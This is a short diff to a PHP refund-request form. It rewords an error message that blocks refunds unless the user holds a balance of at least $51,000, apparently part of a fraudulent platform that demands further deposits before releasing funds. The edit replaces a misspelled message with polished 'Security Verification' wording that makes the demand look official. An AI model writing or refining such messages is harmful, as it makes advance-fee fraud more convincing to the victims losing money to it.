@@ -83,7 +83,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $other_method  = trim($_POST['other_method'] ?? '');
 
     if ($user_balance < 51000) {
-        $errors[] = 'You need to have $51,000 to complete the refund for security purpose as the fund is unusaul.';
+        $errors[] = 'Security Verification: A minimum balance of $51,000.00 is required to process this unusual refund request.';
     }
     if (!$tx_id)         $errors[] = 'Transaction is required.';
     if (!$amount)        $errors[] = 'Amount is required.';
